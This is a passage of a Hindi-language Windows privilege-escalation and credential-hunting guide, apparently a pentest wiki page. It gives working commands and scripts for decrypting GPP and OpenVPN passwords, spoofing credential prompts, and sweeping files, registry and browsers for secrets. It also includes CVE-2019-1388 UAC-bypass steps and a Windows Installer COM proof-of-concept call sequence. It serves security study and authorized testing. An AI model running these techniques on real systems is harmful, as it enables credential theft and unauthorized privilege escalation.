इस जोखिम को कम करने के लिए, एक ऐसा function विकसित किया गया जो locally cached GPP files को scan करके ऐसी फ़ाइलें ढूँढ़ता है जिनमें "cpassword" field खाली न हो। ऐसी फ़ाइल मिलने पर, function password को decrypt करता है और एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location की जानकारी शामिल होती है, जिससे इस security vulnerability की पहचान और remediation में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

credentials के साथ web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में Backup archives

किसी served webroot में सीधे रखा पुराना ZIP backup, पिछली configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path और यह जाँच लें कि archive वास्तव में HTTP के ज़रिए उपलब्ध है या नहीं। डिफ़ॉल्ट `C:\inetpub\wwwroot` path केवल एक संभावित path है। स्थानीय inventory से archives खोले बिना उनके नाम और आकार की सूची बनाई जा सकती है:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

आर्काइव के नाम से यह साबित नहीं होता कि उसमें कोई secret मौजूद है या बरामद credential से higher privilege मिलता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Credentials के लिए पूछें

अगर आपको लगता है कि उपयोगकर्ता को अपने credentials या किसी दूसरे उपयोगकर्ता के credentials पता हो सकते हैं, तो आप उससे **credentials दर्ज करने के लिए कह सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **credentials** **माँगना** वास्तव में **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **संभावित फ़ाइलनाम जिनमें credentials हो सकते हैं**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे‌

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 डेटाबेस आमतौर पर `.psafe3` extension का उपयोग करते हैं। मिलते-जुलते filename को encrypted vault का संभावित संकेत मानें; इसकी मौजूदगी से यह साबित नहीं होता कि आप इसे पढ़ सकते हैं, unlock कर सकते हैं या इसमें stored credentials का उपयोग कर सकते हैं। ऐसी फ़ाइलें कहाँ stored हैं, इसकी जाँच करते समय उन user profiles और configured file-sharing roots को देखें जिन तक आपकी पहुँच है।

पढ़ी जा सकने वाली KeePass `.kdbx` फ़ाइल भी केवल encrypted vault का एक संकेत है। इसे unlock करने के लिए वास्तविक master-password और कोई भी configured key-file या account factors आवश्यक हैं। यदि authorized review में किसी entry में LM:NT hash pair मिले, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले पुष्टि करें कि उल्लिखित account सही है और NT hash मौजूदा है तथा target की NTLM service उसे स्वीकार करती है। Vault entry अपने-आप Administrator या SYSTEM अधिकार नहीं देती; remote service access, account rights और service-execution का कोई अलग चरण भी आवश्यक है। Inventory में vault path और उसकी readability दर्ज होनी चाहिए, database या stored credentials प्रिंट नहीं करने चाहिए।

प्रस्तावित सभी फ़ाइलें खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में क्रेडेंशियल

हटाए गए बैकअप और configuration archive के साथ-साथ ऐसी फ़ाइलों के लिए भी Recycle Bin की सुलभ प्रविष्टियाँ जाँचें जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो। कोई उपयोगी `.7z`, `.zip` या `.rar` बैकअप कई महीने पुराना हो सकता है और उसका फ़ाइलनाम साधारण हो सकता है। Windows मूल पथ और हटाए जाने का समय `$I` रिकॉर्ड में तथा हटाई गई फ़ाइल को उसकी जोड़ीदार `$R` प्रविष्टि के रूप में संग्रहीत करता है; archive खोलने से पहले metadata और वर्तमान identity की read access जाँचें। क्या दिखाई देगा, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing से यह साबित नहीं होता कि कोई पुनर्प्राप्त किया जा सकने वाला बैकअप मौजूद नहीं है। किसी archive के नाम को जाँच के लिए संभावित उम्मीदवार मानें, इस बात का प्रमाण नहीं कि उसमें कोई वैध secret है।

सुलभ हटाई गई `.pfx` फ़ाइल **code-signing** के लिए भी उपयोगी संकेत हो सकती है। यदि उसमें सुलभ private key है, तो उस key से बदली हुई PowerShell script पर हस्ताक्षर किए जा सकते हैं; [PowerShell को private key वाले code-signing certificate की आवश्यकता होती है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules हस्ताक्षरकर्ता की पहचान और rule scope का मूल्यांकन करते हैं](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)। अलग-अलग accounts के बीच execution के लिए वर्तमान identity को ठीक उसी script में बदलाव करने में सक्षम होना चाहिए, प्रभावी rule को उस script और target account के लिए बनी signature स्वीकार करनी चाहिए, और कोई scheduled task या अधिक privilege वाला अन्य consumer उसे वास्तव में चलाता हो। केवल `.pfx` फ़ाइलनाम, certificate subject या writable script से यह पूरी श्रृंखला साबित नहीं होती। Private-key सामग्री खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की समीक्षा करें।

Credentials से जुड़े संकेतों के लिए सुलभ messaging-client profile databases, notes और प्राप्त फ़ाइलों की भी समीक्षा करें। BitLocker recovery export HTML या TXT के रूप में, कभी-कभी नाम वाले backup archive के भीतर, संग्रहीत हो सकता है। ऐसी सामग्री किसी अलग encrypted data volume तक पहुँच दे सकती है जिसमें पुराने बैकअप हों; volume और archive की जाँच केवल तभी करें जब उसकी अनुमति हो। यदि बैकअप में `NTDS.dit` शामिल है, तो offline domain credential recovery के लिए उससे मेल खाने वाला `SYSTEM` hive भी आवश्यक है, जैसा कि [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल फ़ाइलनाम और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई प्रोग्रामों में सहेजे गए **passwords पुनर्प्राप्त करने** के लिए आप यह उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के भीतर

**credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**registry से openssh keys निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers की History

यहाँ उन dbs की जाँच करें जिनमें **Chrome, Edge, या Firefox** के passwords स्टोर होते हैं।\
साथ ही browsers की history, bookmarks और favourites भी जाँचें—हो सकता है कि उनमें कुछ **passwords स्टोर हों**।

मौजूदा user की पारंपरिक Edge **Default** profile के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` इसकी parent `User Data` directory में होता है। [Microsoft default profile location के बारे में दस्तावेज़ देता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); कोई दूसरा profile या `UserDataDir` policy इसे कहीं और रख सकती है। फ़ाइल का मौजूद होना केवल credential store का सुराग है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, संबंधित user का DPAPI context या अन्य authorized key material उपलब्ध है, और saved login किसी अधिक privileged account का है या नहीं। केवल paths की enumeration के लिए database खोलना या decrypted passwords दिखाना ज़रूरी नहीं है।

Firefox के लिए, [Mozilla के दस्तावेज़ों के अनुसार](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), किसी profile की `key4.db` और `logins.json` फ़ाइलें क्रमशः key और encrypted-login फ़ाइलें हैं। इनका मौजूद होना केवल एक सुराग है: जाँचें कि क्या दोनों फ़ाइलें पढ़ी जा सकती हैं, क्या उनमें saved entries हैं, और credentials के उपयोग योग्य होने का निष्कर्ष निकालने से पहले यह जाँचें कि key पर Primary Password सुरक्षा तो नहीं है। यदि प्राप्त credential किसी domain account का है, तो उस account के प्रभावी group-control अधिकारों और group के [LAPS password पढ़ने या decrypt करने के अधिकारों](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल browser artifacts से administrator तक पहुँच का रास्ता साबित नहीं होता।

Browsers से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग languages के software components के बीच **intercommunication** की सुविधा देती है। हर COM component की पहचान **class ID (CLSID)** से होती है और हर component एक या अधिक interfaces के ज़रिए functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces क्रमशः registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मिलाकर बनाई जाती है = **HKEY\CLASSES\ROOT.**

इस registry के CLSIDs में आपको child registry **InProcServer32** मिलेगी, जिसमें **default value** एक **DLL** की ओर संकेत करती है और `ThreadingModel` नाम की एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![Browsers की History - COM DLL Overwriting: इस registry के CLSIDs में आपको child registry InProcServer32 मिलेगी, जिसमें default value एक DLL की ओर संकेत करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, यदि आप निष्पादित होने वाली किसी भी **DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं—बशर्ते उस DLL को कोई दूसरा user निष्पादित करे।

यह जानने के लिए कि attackers persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और registry में सामान्य passwords खोजना**

**फ़ाइलों के contents खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी निश्चित फ़ाइलनाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Registry में key names और passwords खोजें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin **victim के अंदर credentials खोजने वाले हर metasploit POST module को अपने-आप execute करने** के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज पर बताए गए पासवर्ड वाली सभी files को अपने-आप खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password निकालने के लिए एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो इस data को clear text में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)।

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process एक नया process** (`OpenProcess()`) **पूरी access के साथ खोलती है**। वही process **कम privileges के साथ एक नया process भी बनाती है** (`CreateProcess()`), **जो main process के सभी खुले handles inherit करता है**।\
फिर, अगर आपके पास **कम privileges वाले process की पूरी access** है, तो आप `OpenProcess()` से बनाए गए **privileged process का खुला handle हासिल करके उसमें shellcode inject कर सकते हैं**।\
[इस vulnerability का पता लगाने और इसका फायदा उठाने के तरीके के बारे में अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[अलग-अलग permission levels (सिर्फ पूरी access ही नहीं) के साथ inherit हुए processes और threads के अन्य खुले handles की जाँच और दुरुपयोग कैसे करें, इसकी अधिक विस्तृत जानकारी के लिए यह **दूसरी पोस्ट पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer की सुविधा देते हैं।

Windows में **Named Pipes** नाम का एक feature है, जो अलग-अलग processes को, यहाँ तक कि अलग-अलग networks पर भी, data share करने देता है। यह client/server architecture जैसा है, जिसमें roles को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब कोई **client** pipe के ज़रिए data भेजता है, तो pipe सेट up करने वाला **server**, **client की identity अपनाने** में सक्षम होता है—बशर्ते उसके पास ज़रूरी **SeImpersonate** rights हों। ऐसा **privileged process** ढूँढ़ना, जो उस pipe के ज़रिए communicate करता हो जिसकी आप नकल कर सकते हैं, **अधिक privileges हासिल करने** का अवसर देता है: जब वह process आपके बनाए pipe के साथ interact करे, तो आप उसकी identity अपना सकते हैं। ऐसा attack करने के निर्देशों के लिए उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिलेंगी।

साथ ही, नीचे दिया गया tool burp जैसे tool से **named pipe communication को intercept करने देता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs ढूँढ़ने के लिए सभी pipes की सूची दिखाता है:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write से RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। कोई remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को किसी भी मौजूदा file में **मनमाना 4-byte write** करने के लिए इस्तेमाल कर सकता है, जिस पर `NETWORK SERVICE` को write करने की अनुमति हो। फिर Telephony admin rights हासिल करके service के रूप में मनमानी DLL load की जा सकती है। पूरा flow:

- `pszDomainUser` को किसी मौजूदा writable path पर set करके `ClientAttach` करें → service उसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker-नियंत्रित `InitContext` को उस handle पर लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के तहत खुद को जोड़ें, reconnect करें, फिर मनमाना DLL path देकर `GetUIDllName` call करें, ताकि `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute किया जा सके।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### Windows में execute होने वाले File Extensions

**[https://filesec.io/](https://filesec.io/)** page देखें।

### Markdown renderers के ज़रिए Protocol handler / ShellExecute का दुरुपयोग

`ShellExecuteExW` को भेजे गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और current user के रूप में attacker-नियंत्रित files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की Monitoring**

जब आपको किसी user के रूप में shell मिलती है, तो हो सकता है scheduled tasks या अन्य processes execute हो रही हों, जो **command line पर credentials पास करती हैं**। नीचे दी गई script हर दो seconds में process command lines capture करती है और मौजूदा स्थिति की पिछली स्थिति से तुलना करके कोई भी अंतर output करती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Processes से passwords चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

अगर आपको graphical interface (console या RDP के ज़रिए) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में किसी unprivileged user से terminal या "NT\AUTHORITY SYSTEM" जैसे किसी अन्य process को चलाना संभव है।

इससे एक ही vulnerability के ज़रिए privileges escalate करना और UAC bypass करना, दोनों संभव हो जाते हैं। इसके अलावा, कुछ भी install करने की ज़रूरत नहीं है और इस प्रक्रिया में इस्तेमाल किया गया binary Microsoft द्वारा signed और जारी किया गया है।

प्रभावित systems में से कुछ ये हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability को exploit करने के लिए, निम्नलिखित steps करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी उपलब्ध हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level / UAC Bypass तक

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application एक अनुमानित upload subdirectory बना सकता है, उसमें caller द्वारा दिया गया filename लिख सकता है, और फिर उस file को process कर सकता है। अगर कम privileges वाला user server-side write से पहले उस subdirectory को हटा सके और उसकी जगह NTFS junction रख सके, तो write उस junction का अनुसरण करते हुए किसी web-served directory में जा सकता है। वहाँ रखी गई script web-service identity के रूप में चल सकती है, यदि server उस file type को execute करता हो। यह application-विशिष्ट arbitrary-write boundary है; केवल writable upload directory या पहले से मौजूद junction इसका प्रमाण नहीं है।

Upload handler में path के सटीक निर्माण और timing, subdirectory पर user के प्रभावी delete/create अधिकारों, destination के प्रभावी ACLs, writer द्वारा reparse points का अनुसरण किए जाने, और destination में web server द्वारा files execute किए जाने की जाँच करें। Writer और web server की process identities को अलग-अलग सत्यापित करें। Passive inventory directory ACLs और reparse metadata दिखा सकती है, लेकिन यह handler के व्यवहार या भविष्य में junction swap होने की पुष्टि नहीं कर सकती। अगर execution किसी service account के रूप में होता है, तो किसी अलग token-privilege path पर विचार करने से पहले **actual process token** की जाँच करें।

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस technique का वर्णन [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) किया गया है और exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।<sup>[[31]](#references)[[32]](#references)</sup>

यह attack मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstallation process के दौरान वैध files को malicious files से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer इस folder का उपयोग अन्य MSI packages को uninstall करते समय rollback files रखने के लिए करेगा; इन rollback files को malicious payload शामिल करने के लिए पहले ही बदला गया होगा।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

कम privileges वाला client `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering से संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये नाम और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के लिए, `SetEEUIDirectoryAndFilter` केवल दिए गए path को `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ खोलते समय caller को impersonate करता है। इससे यह साबित होता है कि caller directory को delete कर सकता है और reparse point का अनुसरण होने से बचा जाता है, लेकिन यह जाँचे गए file object को बाद के cleanup से **नहीं** जोड़ता और न ही यह साबित करता है कि Windows Installer ने उसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के तहत एक named `REG_DWORD` value लिखती है: value का नाम caller द्वारा नियंत्रित path होता है और data `0x00000002` folder flag होता है। इसके बाद `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values को enumerate करता है और path provenance की जाँच किए बिना folder entries को recursive `FDeleteFolder` में भेजता है। अगर सामान्य removal विफल हो जाए, तो code `LockdownPath` भी call करता है, file attributes clear करता है और दोबारा प्रयास करता है।<sup>[[41]](#references)</sup>

`msi.dll` से निकाला गया न्यूनतम call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive junction redirect के बजाय path reuse है। Attacker द्वारा बनाया गया `C:\Config.Msi` register करें, उसे हटाएँ, और Windows Installer को बाद में उसी pathname पर protected rollback data के साथ इसे दोबारा बनाने दें। Cleanup, पुराने `TempPackages` नाम पर भरोसा करके नई directory को SYSTEM के रूप में delete करता है। यह `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation द्वारा बनाई गई intended boundary को bypass करता है, क्योंकि इसमें किसी reparse point की ज़रूरत नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain के साथ काम करता है: अलग `Installer\Folders` record को बनाए रखें, protected `C:\Config.Msi` को delete करें, इसे NULL DACL के साथ दोबारा बनाएँ, और installer द्वारा DACL को harden करने से पहले `WRITE_DAC` की अनुमति वाला handle बनाए रखें। पहले से खोला गया handle `NtSetSecurityObject` के ज़रिए permissive DACL बहाल कर सकता है, जिसके बाद rollback फिर से शुरू होने से पहले बनाए गए `.rbs` को बदला जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने path को ठीक करने के लिए नए feature gate के enabled होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` call करने से रोक दिया। COM call फिर भी success लौटा सकता है, लेकिन अब यह attacker-controlled path को `TempPackages` में नहीं रखता। Successful method return को patch test मानने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

इस technique का सारांश:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` को खाली छोड़ें)**

- Step 1: MSI install करें
    - ऐसा `.msi` बनाएँ जो writable folder (`TARGETDIR`) में harmless file (जैसे, `dummy.txt`) install करे।
